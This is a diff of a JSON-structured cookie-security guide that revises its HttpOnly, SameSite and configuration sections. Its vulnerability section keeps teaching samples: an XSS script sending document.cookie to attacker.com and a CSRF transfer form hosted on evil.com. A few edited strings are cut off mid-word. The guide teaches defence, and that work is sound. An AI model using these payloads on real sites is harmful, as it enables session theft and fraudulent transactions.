@@ -132,27 +132,27 @@
     {
       "id": "nade9b6fd20e1425",
       "title": "HttpOnly Attribute",
-      "markdown": "The `HttpOnly` attribute prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs. This attribute is crucial for protecting sensitive cookies from XSS attacks.\n\n```\nSet-Cookie: sessionId=abc123; HttpOnly\n```\n\n- Does not protect against CSRF attacks (use SameSite or CSRF tokens)\n- Does not encrypt the cookie value\n- Does not prevent server-side vulnerabilities\n- Does not protect against browser extensions with elevated privileges",
-      "notes": "The HttpOnly attribute prevents client-side JavaScript from accessing the cookie through document.cookie or other DOM APIs. This attribute is crucial for protecting sensitive cookies from XSS attacks.\n\nSet-Cookie: sessionId=abc123; HttpOnly\n- Does not protect against CSRF attacks (use SameSite or CSRF tokens)\n- Does not encrypt the cookie value\n- Does not prevent server-side vulnerabilities\n- Does not protect against browser extensions with elevated privileges",
+      "markdown": "The `HttpOnly` attribute prevents client-side JavaScript from accessing the cookie through `document.cookie` or other DOM APIs. XSS can still run in the page and call your APIs as the user. The flag only keeps the cookie value out of script.\n\n```\nSet-Cookie: sessionId=abc123; HttpOnly\n```\n\n- Does not protect against CSRF attacks (use SameSite or CSRF tokens)\n- Does not encrypt the cookie value\n- Does not prevent server-side vulnerabilities\n- Does not protect against browser extensions with elevated privileges",
+      "notes": "The HttpOnly attribute prevents client-side JavaScript from accessing the cookie through document.cookie or other DOM APIs. XSS can still run in the page and call your APIs as the user. The flag only keeps the cookie value out of script.\n\nSet-Cookie: sessionId=abc123; HttpOnly\n- Does not protect against CSRF attacks (use SameSite or CSRF tokens)\n- Does not encrypt the cookie value\n- Does not prevent server-side vulnerabilities\n- Does not protect against browser extensions with elevated privileges",
       "kind": "topic",
       "level": 2,
       "children": [
         {
           "id": "n1d1c28f0840098c",
           "title": "CRITICAL: HttpOnly Does NOT Protect Against CSRF",
-          "markdown": "**Important Clarification:**\n- \u2705 HttpOnly **protects against XSS** (Cross-Site Scripting)\n- \u274c HttpOnly **does NOT protect against CSRF** (Cross-Site Request Forgery)\n\nThese are two completely different attack vectors. See `CRITICAL_CLARIFICATION` below for detailed explanation.\n\n[**Critical Clarification: HttpOnly vs CSRF Protection**](Critical%20Clarification%20HttpOnly%20vs%20CSRF%20Protection.md)",
-          "notes": "Important Clarification:\n- \u2705 HttpOnly protects against XSS (Cross-Site Scripting)\n- \u274c HttpOnly does NOT protect against CSRF (Cross-Site Request Forgery)\n\nThese are two completely different attack vectors. See CRITICALCLARIFICATION below for detailed explanation.\n\nCritical Clarification: HttpOnly vs CSRF Protection",
+          "markdown": "Important Clarification:\n- HttpOnly keeps the cookie value out of JavaScript. That limits theft during XSS. It does not stop XSS.\n- HttpOnly does not protect against CSRF (Cross-Site Request Forgery)\n\nThese are two completely different attack vectors. See `CRITICAL_CLARIFICATION` below for detailed explanation.\n\n[Critical Clarification: HttpOnly vs CSRF Protection](Critical%20Clarification%20HttpOnly%20vs%20CSRF%20Protection.md)",
+          "notes": "Important Clarification:\n- HttpOnly keeps the cookie value out of JavaScript. That limits theft during XSS. It does not stop XSS.\n- HttpOnly does not protect against CSRF (Cross-Site Request Forgery)\n\nThese are two completely different attack vectors. See CRITICALCLARIFICATION below for detailed explanation.\n\nCritical Clarification: HttpOnly vs CSRF Protection",
           "kind": "topic",
           "level": 3,
           "children": [],
-          "blurb": "Important Clarification: - \u2705 HttpOnly protects against XSS (Cross-Site...",
+          "blurb": "Important Clarification: - HttpOnly keeps the cookie value out of JavaScript.",
           "expanded": false
         },
         {
           "id": "n181655b49874034",
           "title": "How It Works",
-          "markdown": "When a cookie has the `HttpOnly` flag:\n- \u2705 The cookie is sent with HTTP requests automatically\n- \u2705 Server-side code can read and write the cookie\n- \u274c JavaScript cannot access the cookie via `document.cookie`\n- \u274c Browser extensions cannot access the cookie (in most cases)",
-          "notes": "When a cookie has the HttpOnly flag:\n- \u2705 The cookie is sent with HTTP requests automatically\n- \u2705 Server-side code can read and write the cookie\n- \u274c JavaScript cannot access the cookie via document.cookie\n- \u274c Browser extensions cannot access the cookie (in most cases)",
+          "markdown": "When a cookie has the `HttpOnly` flag:\n- \u2705 The cookie is sent with HTTP requests automatically\n- \u2705 Server-side code can read and write the cookie\n- Page script cannot read the cookie via `document.cookie`\n- An extension with the browser's cookie permission can still read it",
+          "notes": "When a cookie has the HttpOnly flag:\n- \u2705 The cookie is sent with HTTP requests automatically\n- \u2705 Server-side code can read and write the cookie\n- Page script cannot read the cookie via document.cookie\n- An extension with the browser's cookie permission can still read it",
           "kind": "topic",
           "level": 3,
           "children": [],
@@ -171,8 +171,8 @@
           "expanded": false
         },
         {
-          "id": "ne977dd00ed660c9",
-          "title": "Example: With HttpOnly (Protected from XSS)",
+          "id": "n287276a7daf1514",
+          "title": "Example: With HttpOnly (script cannot read the value)",
           "markdown": "```jsx\n// Server sets cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly\n// JavaScript cannot access itconsole.log(document.cookie); // Does not include sessionId// Result: \"\" (empty or other non-HttpOnly cookies)\n```",
           "notes": "// Server sets cookie with HttpOnlySet-Cookie: sessionId=abc123; HttpOnly\n// JavaScript cannot access itconsole.log(document.cookie); // Does not include sessionId// Result: \"\" (empty or other non-HttpOnly cookies)",
           "kind": "topic",
@@ -195,7 +195,7 @@
         {
           "id": "nb545bdeab2f1ac1",
           "title": "When to Use HttpOnly",
-          "markdown": "**Always use HttpOnly for:**",
+          "markdown": "Always use HttpOnly for:",
           "notes": "Always use HttpOnly for:",
           "kind": "topic",
           "level": 3,
@@ -318,7 +318,7 @@
         {
           "id": "n2a6815f9d23f7c2",
           "title": "When to Use Secure",
-          "markdown": "**Always use Secure for:**",
+          "markdown": "Always use Secure for:",
           "notes": "Always use Secure for:",
           "kind": "topic",
           "level": 3,
@@ -520,7 +520,7 @@
         {
           "id": "n1cfac76583a68d3",
           "title": "This is What Actually Protects Against CSRF",
-          "markdown": "Unlike HttpOnly, the `SameSite` attribute **does protect against CSRF attacks** by controlling when cookies are sent with requests.",
+          "markdown": "Unlike HttpOnly, the `SameSite` attribute does protect against CSRF attacks by controlling when cookies are sent with requests.",
           "notes": "Unlike HttpOnly, the SameSite attribute does protect against CSRF attacks by controlling when cookies are sent with requests.",
           "kind": "topic",
           "level": 3,
@@ -539,7 +539,7 @@
             {
               "id": "n0ee6ef72341a693",
               "title": "SameSite=Strict",
-              "markdown": "**Behavior:**",
+              "markdown": "Behavior:",
               "notes": "Behavior:",
               "kind": "topic",
               "level": 3,
@@ -628,7 +628,7 @@
             {
               "id": "nd6d53662f649409",
               "title": "SameSite=Lax (Default in Modern Browsers)",
-              "markdown": "**Behavior:**",
+              "markdown": "Behavior:",
               "notes": "Behavior:",
               "kind": "topic",
               "level": 3,
@@ -728,7 +728,7 @@
             {
               "id": "nd2dddf42dfaf995",
               "title": "SameSite=None",
-              "markdown": "**Behavior:**",
+              "markdown": "Behavior:",
               "notes": "Behavior:",
               "kind": "topic",
               "level": 3,
@@ -850,7 +850,7 @@
             {
               "id": "n3f1b9d9994038dd",
               "title": "SameSite Default Behavior",
-              "markdown": "**Modern Browsers (2020+):**",
+              "markdown": "Modern Browsers (2020+):",
               "notes": "Modern Browsers (2020+):",
               "kind": "topic",
               "level": 3,
@@ -917,7 +917,7 @@
             {
               "id": "ne240b12297219b7",
               "title": "SameSite and CSRF Protection",
-              "markdown": "**How SameSite Prevents CSRF:**\n\n1. **Strict Mode:**\n\n    ```\n    Attacker's site: evil.com\n    Target site: bank.com\n\n    User visits evil.com, which contains:\n    <form action=\"https://bank.com/transfer\" method=\"POST\">\n      <input name=\"to\" value=\"attacker\">\n      <input name=\"amount\" value=\"10000\">\n    </form>\n\n    Browser sends request WITHOUT cookie (cross-site POST)\n    Attack fails\n    ```\n\n2. **Lax Mode:**\n\n    ```\n    Same scenario as above - cookie not sent with POST\n    But cookie IS sent when user clicks link (GET navigation)\n    ```\n\n3. **None Mode:**\n\n    ```\n    Cookie IS sent - no CSRF protection\n    Must use additional CSRF tokens\n    ```",
+              "markdown": "How SameSite Prevents CSRF:\n\n1. Strict Mode:\n\n    ```\n    Attacker's site: evil.com\n    Target site: bank.com\n\n    User visits evil.com, which contains:\n    <form action=\"https://bank.com/transfer\" method=\"POST\">\n      <input name=\"to\" value=\"attacker\">\n      <input name=\"amount\" value=\"10000\">\n    </form>\n\n    Browser sends request WITHOUT cookie (cross-site POST)\n    Attack fails\n    ```\n\n2. Lax Mode:\n\n    ```\n    Same scenario as above - cookie not sent with POST\n    But cookie IS sent when user clicks link (GET navigation)\n    ```\n\n3. None Mode:\n\n    ```\n    Cookie IS sent - no CSRF protection\n    Must use additional CSRF tokens\n    ```",
               "notes": "How SameSite Prevents CSRF:\n\n1. Strict Mode:\n\n    \n    Attacker's site: evil.com\n    Target site: bank.com\n\n    User visits evil.com, which contains:\n    <form action=\"https://bank.com/transfer\" method=\"POST\">\n      <input name=\"to\" value=\"attacker\">\n      <input name=\"amount\" value=\"10000\">\n    </form>\n\n    Browser sends request WITHOUT cookie (cross-site POST)\n    Attack fails\n\n2. Lax Mode:\n\n    \n    Same scenario as above - cookie not sent with POST\n    But cookie IS sent when user clicks link (GET navigation)\n\n3. None Mode:\n\n    \n    Cookie IS sent - no CSRF protection\n    Must use additional CSRF tokens",
               "kind": "topic",
               "level": 3,
@@ -944,7 +944,7 @@
         {
           "id": "n5a305bd80a8818a",
           "title": "__Secure- Prefix",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -1011,7 +1011,7 @@
         {
           "id": "n4faecdf59fef670",
           "title": "__Host- Prefix",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -1145,7 +1145,7 @@
         {
           "id": "n1edb60095b1f3ad",
           "title": "Domain Attribute",
-          "markdown": "**Purpose:**\nControls which domains can receive the cookie.\n\n**Syntax:**\n\n```\nSet-Cookie: sessionId=abc123; Domain=example.com\n```\n\n**Behavior:**",
+          "markdown": "Purpose:\nControls which domains can receive the cookie.\n\nSyntax:\n\n```\nSet-Cookie: sessionId=abc123; Domain=example.com\n```\n\nBehavior:",
           "notes": "Purpose:\nControls which domains can receive the cookie.\n\nSyntax:\n\nSet-Cookie: sessionId=abc123; Domain=example.com\n\nBehavior:",
           "kind": "topic",
           "level": 3,
@@ -1245,7 +1245,7 @@
         {
           "id": "n34a897968596cf1",
           "title": "Path Attribute",
-          "markdown": "**Purpose:**\nControls which URL paths can access the cookie.\n\n**Syntax:**\n\n```\nSet-Cookie: sessionId=abc123; Path=/api\n```\n\n**Behavior:**",
+          "markdown": "Purpose:\nControls which URL paths can access the cookie.\n\nSyntax:\n\n```\nSet-Cookie: sessionId=abc123; Path=/api\n```\n\nBehavior:",
           "notes": "Purpose:\nControls which URL paths can access the cookie.\n\nSyntax:\n\nSet-Cookie: sessionId=abc123; Path=/api\n\nBehavior:",
           "kind": "topic",
           "level": 3,
@@ -1312,7 +1312,7 @@
         {
           "id": "nd5a01eab126d090",
           "title": "Expires and Max-Age Attributes",
-          "markdown": "**Purpose:**\nControl when the cookie expires and is deleted.\n\n**Expires:**\n\n```\nSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT\n```",
+          "markdown": "Purpose:\nControl when the cookie expires and is deleted.\n\nExpires:\n\n```\nSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT\n```",
           "notes": "Purpose:\nControl when the cookie expires and is deleted.\n\nExpires:\n\nSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2025 07:28:00 GMT",
           "kind": "topic",
           "level": 3,
@@ -1446,7 +1446,7 @@
         {
           "id": "ne58b954394f86bf",
           "title": "Recommended Configuration for Session Cookies",
-          "markdown": "```\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n```\n\n**Why this configuration:**",
+          "markdown": "```\nSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n```\n\nWhy this configuration:",
           "notes": "Set-Cookie: Host-sessionId=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600\n\nWhy this configuration:",
           "kind": "topic",
           "level": 3,
@@ -1524,7 +1524,7 @@
         {
           "id": "n85f499a6c35016a",
           "title": "Recommended Configuration for Authentication Cookies",
-          "markdown": "```\nSet-Cookie: __Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400\n```\n\n**Why this configuration:**",
+          "markdown": "```\nSet-Cookie: __Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400\n```\n\nWhy this configuration:",
           "notes": "Set-Cookie: Secure-authToken=xyz789; Secure; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400\n\nWhy this configuration:",
           "kind": "topic",
           "level": 3,
@@ -1602,7 +1602,7 @@
         {
           "id": "nb59d91c9b3ec972",
           "title": "Recommended Configuration for Third-Party Cookies",
-          "markdown": "```\nSet-Cookie: __Secure-widgetSession=def456; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n```\n\n**Why this configuration:**",
+          "markdown": "```\nSet-Cookie: __Secure-widgetSession=def456; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n```\n\nWhy this configuration:",
           "notes": "Set-Cookie: Secure-widgetSession=def456; Secure; HttpOnly; SameSite=None; Path=/; Max-Age=1800\n\nWhy this configuration:",
           "kind": "topic",
           "level": 3,
@@ -1994,7 +1994,7 @@
         {
           "id": "n428c1eefe7d6cc1",
           "title": "Testing Cookie Attributes",
-          "markdown": "**Browser DevTools:**\n1. Open DevTools (F12)\n2. Go to Application/Storage tab\n3. Click Cookies\n4. View cookie attributes\n\n**Command Line (curl):**\n\n```bash\n# Check Set-Cookie headercurl -I https://example.com/login\n# Check if cookie is sentcurl -v -H \"Cookie: sessionId=abc123\" https://example.com/api\n```\n\n**Online Tools:**",
+          "markdown": "Browser DevTools:\n1. Open DevTools (F12)\n2. Go to Application/Storage tab\n3. Click Cookies\n4. View cookie attributes\n\nCommand Line (curl):\n\n```bash\n# Check Set-Cookie headercurl -I https://example.com/login\n# Check if cookie is sentcurl -v -H \"Cookie: sessionId=abc123\" https://example.com/api\n```\n\nOnline Tools:",
           "notes": "Browser DevTools:\n1. Open DevTools (F12)\n2. Go to Application/Storage tab\n3. Click Cookies\n4. View cookie attributes\n\nCommand Line (curl):\n\nCheck Set-Cookie headercurl -I https://example.com/login\nCheck if cookie is sentcurl -v -H \"Cookie: sessionId=abc123\" https://example.com/api\n\nOnline Tools:",
           "kind": "topic",
           "level": 3,
@@ -2051,7 +2051,7 @@
         {
           "id": "n2f33d4bbd0093dc",
           "title": "Missing HttpOnly (XSS Vulnerability)",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// Cookie set without HttpOnlySet-Cookie: sessionId=abc123\n// XSS attack<script>  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;</script>\n```\n\n**Mitigation:**\n\n```jsx\n// Always use HttpOnly for sensitive cookiesSet-Cookie: sessionId=abc123; HttpOnly\n```",
+          "markdown": "Vulnerability:\n\n```jsx\n// Cookie set without HttpOnlySet-Cookie: sessionId=abc123\n// XSS attack<script>  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;</script>\n```\n\nMitigation:\n\n```jsx\n// Always use HttpOnly for sensitive cookiesSet-Cookie: sessionId=abc123; HttpOnly\n```",
           "notes": "Vulnerability:\n\n// Cookie set without HttpOnlySet-Cookie: sessionId=abc123\n// XSS attack<script>  document.location = 'https://attacker.com/steal?cookie=' + document.cookie;</script>\n\nMitigation:\n\n// Always use HttpOnly for sensitive cookiesSet-Cookie: sessionId=abc123; HttpOnly",
           "kind": "topic",
           "level": 3,
@@ -2062,7 +2062,7 @@
         {
           "id": "n29665edf304e370",
           "title": "Missing Secure (MitM Vulnerability)",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// Cookie set without SecureSet-Cookie: sessionId=abc123; HttpOnly\n// Attacker on same network intercepts HTTP traffic// Cookie sent in plaintext, can be stolen\n```\n\n**Mitigation:**\n\n```jsx\n// Always use Secure in productionSet-Cookie: sessionId=abc123; HttpOnly; Secure\n```",
+          "markdown": "Vulnerability:\n\n```jsx\n// Cookie set without SecureSet-Cookie: sessionId=abc123; HttpOnly\n// Attacker on same network intercepts HTTP traffic// Cookie sent in plaintext, can be stolen\n```\n\nMitigation:\n\n```jsx\n// Always use Secure in productionSet-Cookie: sessionId=abc123; HttpOnly; Secure\n```",
           "notes": "Vulnerability:\n\n// Cookie set without SecureSet-Cookie: sessionId=abc123; HttpOnly\n// Attacker on same network intercepts HTTP traffic// Cookie sent in plaintext, can be stolen\n\nMitigation:\n\n// Always use Secure in productionSet-Cookie: sessionId=abc123; HttpOnly; Secure",
           "kind": "topic",
           "level": 3,
@@ -2073,7 +2073,7 @@
         {
           "id": "nd9c758fc71bc484",
           "title": "Missing SameSite (CSRF Vulnerability)",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// Cookie set without SameSiteSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// CSRF attack// Attacker's site: evil.com<form action=\"https://bank.com/transfer\" method=\"POST\">  <input name=\"to\" value=\"attacker\">  <input name=\"amount\" value=\"10000\"></form>// Cookie sent with cross-site request\n```\n\n**Mitigation:**\n\n```jsx\n// Use SameSite=Strict or LaxSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n```\n\n**Note:** HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.",
+          "markdown": "Vulnerability:\n\n```jsx\n// Cookie set without SameSiteSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// CSRF attack// Attacker's site: evil.com<form action=\"https://bank.com/transfer\" method=\"POST\">  <input name=\"to\" value=\"attacker\">  <input name=\"amount\" value=\"10000\"></form>// Cookie sent with cross-site request\n```\n\nMitigation:\n\n```jsx\n// Use SameSite=Strict or LaxSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n```\n\nNote: HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.",
           "notes": "Vulnerability:\n\n// Cookie set without SameSiteSet-Cookie: sessionId=abc123; HttpOnly; Secure\n// CSRF attack// Attacker's site: evil.com<form action=\"https://bank.com/transfer\" method=\"POST\">  <input name=\"to\" value=\"attacker\">  <input name=\"amount\" value=\"10000\"></form>// Cookie sent with cross-site request\n\nMitigation:\n\n// Use SameSite=Strict or LaxSet-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict\n\nNote: HttpOnly does NOT prevent this CSRF attack. Only SameSite (or CSRF tokens) can prevent it.",
           "kind": "topic",
           "level": 3,
@@ -2084,7 +2084,7 @@
         {
           "id": "n54c671a701bf59d",
           "title": "Overly Broad Domain (Subdomain Attack)",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// Cookie set with broad domainSet-Cookie: sessionId=abc123; Domain=.example.com// If subdomain.example.com is compromised// Attacker can access the cookie\n```\n\n**Mitigation:**\n\n```jsx\n// Don't set Domain, or use __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/\n```",
+          "markdown": "Vulnerability:\n\n```jsx\n// Cookie set with broad domainSet-Cookie: sessionId=abc123; Domain=.example.com// If subdomain.example.com is compromised// Attacker can access the cookie\n```\n\nMitigation:\n\n```jsx\n// Don't set Domain, or use __Host- prefixSet-Cookie: __Host-sessionId=abc123; Secure; HttpOnly; Path=/\n```",
           "notes": "Vulnerability:\n\n// Cookie set with broad domainSet-Cookie: sessionId=abc123; Domain=.example.com// If subdomain.example.com is compromised// Attacker can access the cookie\n\nMitigation:\n\n// Don't set Domain, or use Host- prefixSet-Cookie: Host-sessionId=abc123; Secure; HttpOnly; Path=/",
           "kind": "topic",
           "level": 3,
@@ -2095,7 +2095,7 @@
         {
           "id": "n57cdf10699a65e3",
           "title": "Long-Lived Cookies (Session Fixation)",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// Cookie with very long expirationSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2030 07:28:00 GMT\n// If stolen, remains valid for years\n```\n\n**Mitigation:**\n\n```jsx\n// Use short expiration timesSet-Cookie: sessionId=abc123; Max-Age=3600  // 1 hour// Implement server-side session rotation// Regenerate session ID periodically\n```",
+          "markdown": "Vulnerability:\n\n```jsx\n// Cookie with very long expirationSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2030 07:28:00 GMT\n// If stolen, remains valid for years\n```\n\nMitigation:\n\n```jsx\n// Use short expiration timesSet-Cookie: sessionId=abc123; Max-Age=3600  // 1 hour// Implement server-side session rotation// Regenerate session ID periodically\n```",
           "notes": "Vulnerability:\n\n// Cookie with very long expirationSet-Cookie: sessionId=abc123; Expires=Wed, 21 Oct 2030 07:28:00 GMT\n// If stolen, remains valid for years\n\nMitigation:\n\n// Use short expiration timesSet-Cookie: sessionId=abc123; Max-Age=3600  // 1 hour// Implement server-side session rotation// Regenerate session ID periodically",
           "kind": "topic",
           "level": 3,
@@ -2106,7 +2106,7 @@
         {
           "id": "nb30742e86848519",
           "title": "SameSite=None Without Secure",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// SameSite=None without Secure (invalid, but some servers allow)Set-Cookie: sessionId=abc123; SameSite=None\n// Modern browsers reject this, but legacy behavior may differ\n```\n\n**Mitigation:**\n\n```jsx\n// Always use Secure with SameSite=NoneSet-Cookie: sessionId=abc123; SameSite=None; Secure\n```",
+          "markdown": "Vulnerability:\n\n```jsx\n// SameSite=None without Secure (invalid, but some servers allow)Set-Cookie: sessionId=abc123; SameSite=None\n// Modern browsers reject this, but legacy behavior may differ\n```\n\nMitigation:\n\n```jsx\n// Always use Secure with SameSite=NoneSet-Cookie: sessionId=abc123; SameSite=None; Secure\n```",
           "notes": "Vulnerability:\n\n// SameSite=None without Secure (invalid, but some servers allow)Set-Cookie: sessionId=abc123; SameSite=None\n// Modern browsers reject this, but legacy behavior may differ\n\nMitigation:\n\n// Always use Secure with SameSite=NoneSet-Cookie: sessionId=abc123; SameSite=None; Secure",
           "kind": "topic",
           "level": 3,
@@ -2117,7 +2117,7 @@
         {
           "id": "n081a0cf57952eef",
           "title": "Cookie Theft via Document.cookie",
-          "markdown": "**Vulnerability:**\n\n```jsx\n// Cookie accessible via JavaScriptSet-Cookie: sessionId=abc123  // Missing HttpOnly// Any script can access itvar cookie = document.cookie;\n```\n\n**Mitigation:**\n\n```jsx\n// Use HttpOnlySet-Cookie: sessionId=abc123; HttpOnly\n// JavaScript cannot access itconsole.log(document.cookie);  // Does not include sessionId\n```",
+          "markdown": "Vulnerability:\n\n```jsx\n// Cookie accessible via JavaScriptSet-Cookie: sessionId=abc123  // Missing HttpOnly// Any script can access itvar cookie = document.cookie;\n```\n\nMitigation:\n\n```jsx\n// Use HttpOnlySet-Cookie: sessionId=abc123; HttpOnly\n// JavaScript cannot access itconsole.log(document.cookie);  // Does not include sessionId\n```",
           "notes": "Vulnerability:\n\n// Cookie accessible via JavaScriptSet-Cookie: sessionId=abc123  // Missing HttpOnly// Any script can access itvar cookie = document.cookie;\n\nMitigation:\n\n// Use HttpOnlySet-Cookie: sessionId=abc123; HttpOnly\n// JavaScript cannot access itconsole.log(document.cookie);  // Does not include sessionId",
           "kind": "topic",
           "level": 3,
@@ -2140,7 +2140,7 @@
         {
           "id": "n5a8a3749c1f19d9",
           "title": "Scenario 1: E-Commerce Session Management",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -2251,7 +2251,7 @@
         {
           "id": "n76dc718d49464b9",
           "title": "Scenario 2: Banking Application",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -2329,7 +2329,7 @@
         {
           "id": "nbadc98a72bfcfb1",
           "title": "Scenario 3: OAuth/SSO Integration",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -2418,7 +2418,7 @@
         {
           "id": "n9dbe6791088a220",
           "title": "Scenario 4: Multi-Tenant SaaS Application",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -2496,7 +2496,7 @@
         {
           "id": "n13dfdc6e3f277ef",
           "title": "Scenario 5: API Authentication",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -2574,7 +2574,7 @@
         {
           "id": "n79f462f4e2990d3",
           "title": "Scenario 6: Remember Me Functionality",
-          "markdown": "**Requirements:**",
+          "markdown": "Requirements:",
           "notes": "Requirements:",
           "kind": "topic",
           "level": 3,
@@ -2675,8 +2675,8 @@
         {
           "id": "n6d3db0fcc960154",
           "title": "Partitioned cookies (CHIPS) for embedded contexts",
-          "markdown": "Modern browsers support **partitioned cookies** for some third-party scenarios so state is isolated per top-level site.\n\nExample concept:\n\n```http\nSet-Cookie: __Secure-widgetSession=<token>; Secure; HttpOnly; SameSite=None; Partitioned; Path=/\n```\n\nWhy this matters:",
-          "notes": "Modern browsers support partitioned cookies for some third-party scenarios so state is isolated per top-level site.\n\nExample concept:\n\nSet-Cookie: Secure-widgetSession=<token>; Secure; HttpOnly; SameSite=None; Partitioned; Path=/\n\nWhy this matters:",
+          "markdown": "Modern browsers support partitioned cookies for some third-party scenarios so state is isolated per top-level site.\n\nExample concept:\n\n```http\nSet-Cookie: __Secure-widgetSession=<token>; Secure; HttpOnly; SameSite=None; Partitioned; Path=/\n```\n\nWhat you get:",
+          "notes": "Modern browsers support partitioned cookies for some third-party scenarios so state is isolated per top-level site.\n\nExample concept:\n\nSet-Cookie: Secure-widgetSession=<token>; Secure; HttpOnly; SameSite=None; Partitioned; Path=/\n\nWhat you get:",
           "kind": "topic",
           "level": 3,
           "children": [
@@ -2843,7 +2843,7 @@
         {
           "id": "n2d3fdccf6fd3a1e",
           "title": "Essential Cookie Security Checklist",
-          "markdown": "\u2705 **Always use for sensitive cookies:**",
+          "markdown": "\u2705 Always use for sensitive cookies:",
           "notes": "\u2705 Always use for sensitive cookies:",
           "kind": "topic",
           "level": 3,
@@ -3021,17 +3021,17 @@
         {
           "id": "nbebfdae9bc84b2f",
           "title": "Key Takeaways",
-          "markdown": "HttpOnly protects against XSS, NOT CSRF",
-          "notes": "HttpOnly protects against XSS, NOT CSRF",
+          "markdown": "HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does no",
+          "notes": "HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does no",
           "kind": "topic",
           "level": 3,
           "children": [
             {
-              "id": "n7531130f79f2ad4",
-              "title": "HttpOnly protects against XSS, NOT CSRF",
-              "markdown": "- HttpOnly protects against XSS, NOT CSRF",
-              "notes": "HttpOnly protects against XSS, NOT CSRF",
-              "blurb": "HttpOnly protects against XSS, NOT CSRF",
+              "id": "n3a75299616e1a31",
+              "title": "HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does no",
+              "markdown": "- HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does no",
+              "notes": "HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does no",
+              "blurb": "HttpOnly stops JavaScript from reading the cookie.",
               "kind": "topic",
               "level": 4,
               "children": [],
@@ -3082,7 +3082,7 @@
               "expanded": false
             }
           ],
-          "blurb": "HttpOnly protects against XSS, NOT CSRF",
+          "blurb": "HttpOnly stops JavaScript from reading the cookie.",
           "expanded": false
         }
       ],
@@ -3100,28 +3100,28 @@
         {
           "id": "n97e99326b2752b7",
           "title": "Critical Clarification",
-          "markdown": "**HttpOnly protects against XSS, NOT CSRF!**",
-          "notes": "HttpOnly protects against XSS, NOT CSRF!",
+          "markdown": "HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does not stop XSS from acting as the user.",
+          "notes": "HttpOnly stops JavaScript from reading the cookie. It does not stop CSRF, and it does not stop XSS from acting as the user.",
           "kind": "topic",
           "level": 2,
           "children": [
             {
-              "id": "n95ee3c9a42e4984",
-              "title": "HttpOnly = XSS protection",
-              "markdown": "- HttpOnly = XSS protection",
-              "notes": "HttpOnly = XSS protection",
-              "blurb": "HttpOnly = XSS protection",
+              "id": "nefc73a4c9cf0c7f",
+              "title": "HttpOnly = no document.cookie",
+              "markdown": "- HttpOnly = no document.cookie",
+              "notes": "HttpOnly = no document.cookie",
+              "blurb": "HttpOnly = no document.cookie",
               "kind": "topic",
               "level": 3,
               "children": [],
               "expanded": false
             },
             {
-              "id": "n5575af296ca6bd1",
-              "title": "SameSite = CSRF protection",
-              "markdown": "- SameSite = CSRF protection",
-              "notes": "SameSite = CSRF protection",
-              "blurb": "SameSite = CSRF protection",
+              "id": "n05a051a14ff8154",
+              "title": "SameSite = fewer cross-site cookies",
+              "markdown": "- SameSite = fewer cross-site cookies",
+              "notes": "SameSite = fewer cross-site cookies",
+              "blurb": "SameSite = fewer cross-site cookies",
               "kind": "topic",
               "level": 3,
               "children": [],
@@ -3139,14 +3139,14 @@
               "expanded": false
             }
           ],
-          "blurb": "HttpOnly protects against XSS, NOT CSRF!",
+          "blurb": "HttpOnly stops JavaScript from reading the cookie.",
           "expanded": false
         },
         {
           "id": "n1c48e3cdb2bef33",
           "title": "Cookie Attributes Cheat Sheet",
